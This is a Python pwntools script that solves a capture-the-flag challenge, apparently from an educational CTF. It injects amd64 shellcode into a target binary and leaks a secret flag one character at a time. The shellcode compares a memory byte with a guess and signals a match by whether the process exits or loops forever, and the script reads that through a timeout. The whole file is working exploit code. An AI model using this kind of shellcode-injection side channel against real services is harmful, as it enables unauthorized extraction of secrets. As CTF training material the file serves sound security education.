from pwn import *
context.arch = 'amd64'

idx = 0
flag = '' 
while True:
    guess = 0x20
    while guess < 0x80 :
        r = process('./share/chal')
        # r = remote('edu-ctf.zoolab.org',10012)

        ### ref : python f-string 
        shellcode = asm(f'''
            add r13, 0x2db7
            add r13, {idx}   ##  flag offset 
            mov rax, [r13]
            mov cl, {guess}  
            cmp al, cl
            je the_same
        infinity1:
            jmp infinity1
        the_same:
            mov rax, 0x3c
            mov rdi, 0
            syscall    
        ''')
        r.sendafter(b"code\n\x00", shellcode)
        try :
            r.recv(timeout=0.2) ### go to exception when shellcode go to the_same, because socket fetch a non-exist process 
            ### timeout because process in the infinite loop 
            guess += 1        
            r.close()
            
        except:
            flag += chr(guess)
            idx += 1 # need to change flag offset when guess correct chr 
            print(flag)
            r.close()
            break
    
    if flag[-1] == '}':
        break      

print(flag)